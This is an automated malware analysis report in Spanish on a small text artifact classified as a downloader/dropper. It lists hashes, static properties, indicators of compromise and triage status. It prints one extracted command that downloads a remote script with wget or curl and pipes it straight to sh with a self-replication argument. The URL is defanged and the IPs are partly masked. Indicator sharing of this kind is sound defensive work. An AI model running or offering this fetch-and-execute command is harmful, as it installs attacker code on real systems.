# 🧬 Payload Analysis

`2c5f45cee18794f5816703c5c215a30bb9d28b39d16c574a25e9382bc001b9e4`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 368 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxps://14.46.136.XXX/sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:53.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `2c5f45cee18794f5816703c5c215a30bb9d28b39d16c574a25e9382bc001b9e4`
- **SHA1:** `2fc73e1876a5ac6947c178019e5bc096fee597dc`
- **MD5:** `66f5650d50d14e58651a01a60b3989c0`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 368 B |
| Entropía | 5.13 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrep
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh) | strings |
| url | hxxps://14.46.136.XXX/sh | strings |
| ip | 190.179.177.XXX | static_analysis |
| ip | 14.46.136.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrep | strings |
| hash | 2c5f45cee18794f5816703c5c215a30bb9d28b39d16c574a25e9382bc001b9e4 | static_analysis |
| ip | 112.170.9.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
